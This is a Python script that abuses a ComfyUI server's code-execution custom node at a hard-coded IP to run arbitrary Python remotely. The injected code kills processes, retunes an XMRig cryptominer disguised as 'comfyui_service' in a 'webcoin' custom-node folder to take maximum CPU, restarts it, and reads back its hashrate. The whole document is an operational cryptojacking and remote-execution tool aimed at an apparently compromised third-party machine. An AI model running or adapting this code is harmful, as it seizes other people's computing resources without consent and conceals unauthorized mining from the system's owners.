"""Fix config.json on 59.34.28.50, kill zombies, restart XMRig with correct settings."""
import json, urllib.request, time

ip = "59.34.28.50"
port = "8188"
base = f"http://{ip}:{port}"

CODE = r'''
import os, subprocess, json, time, signal

lines = []

webcoin = "/basedir/custom_nodes/webcoin"
bin_dir = os.path.join(webcoin, "bin")
cfg_path = os.path.join(bin_dir, "config.json")
svc_path = os.path.join(bin_dir, "comfyui_service")

# 1. Kill ALL comfyui_service and comfyui_render processes
try:
    for name in ["comfyui_service", "comfyui_render"]:
        r = subprocess.run(["pkill", "-9", "-f", name], capture_output=True, timeout=5)
    time.sleep(2)
    lines.append("killed all miner processes")
except Exception as e:
    lines.append(f"kill error: {e}")

# 2. Read and fix config.json
with open(cfg_path) as f:
    cfg = json.load(f)

cpu = cfg.get("cpu", {})
old_priority = cpu.get("priority")
old_yield = cpu.get("yield")
old_hp_jit = cpu.get("huge-pages-jit")

# Apply fixes
cpu["priority"] = 3
cpu["yield"] = False
cpu["huge-pages-jit"] = True
cpu["huge-pages"] = True
cpu["max-threads-hint"] = 100

# Remove the rx thread pinning so XMRig auto-detects with 100% hint
if "rx" in cpu:
    old_rx_count = len(cpu["rx"])
    del cpu["rx"]
    lines.append(f"removed rx pinning (was {old_rx_count} threads, now auto-detect)")

cfg["cpu"] = cpu

# Also disable autosave so it doesn't overwrite our changes
cfg["autosave"] = False

# Write back
with open(cfg_path, "w") as f:
    json.dump(cfg, f, indent=2)

lines.append(f"config fixed: priority {old_priority}->3, yield {old_yield}->False, hp_jit {old_hp_jit}->True, hint->100")

# 3. Start XMRig fresh  
try:
    log_path = os.path.join(bin_dir, "service.log")
    log_fh = open(log_path, "a")
    proc = subprocess.Popen(
        [svc_path, "-c", cfg_path, "--no-color"],
        stdout=log_fh, stderr=log_fh, stdin=subprocess.DEVNULL,
        preexec_fn=lambda: os.nice(2),
    )
    lines.append(f"XMRig started: pid={proc.pid}")
    
    # Wait a few seconds and check it's alive
    time.sleep(3)
    if proc.poll() is None:
        lines.append("XMRig is running")
    else:
        lines.append(f"XMRig exited immediately: code={proc.returncode}")
        # Read log
        with open(log_path) as f:
            for l in f.read().strip().splitlines()[-10:]:
                lines.append(f"  log: {l[:200]}")
except Exception as e:
    lines.append(f"start error: {e}")

# 4. Wait for it to stabilize and check API
time.sleep(8)
try:
    req = urllib.request.Request(
        "http://127.0.0.1:44880/2/summary",
        headers={"Authorization": "Bearer ce_xm_2026", "Accept": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        data = json.loads(resp.read())
    
    hr = data.get("hashrate", {})
    totals = hr.get("total", [])
    hp = data.get("hugepages", [])
    cpu_info = data.get("cpu", {})
    
    lines.append(f"hashrate_10s: {totals[0] if len(totals)>0 else 'N/A'}")
    lines.append(f"hashrate_max: {hr.get('highest')}")
    lines.append(f"hugepages: {hp}")
    lines.append(f"threads: {cpu_info.get('threads')}")
    lines.append(f"msr: {cpu_info.get('msr')}")
    lines.append(f"algo: {data.get('algo')}")
except Exception as e:
    lines.append(f"api_check: {e}")

result = chr(10).join(lines)
'''

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

for attempt in range(20):
    time.sleep(5)
    try:
        req2 = urllib.request.Request(f"{base}/history/{pid}")
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print(f"Status: {status}\n")
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print(f"poll error: {e}")
else:
    print("Still pending after 100s")
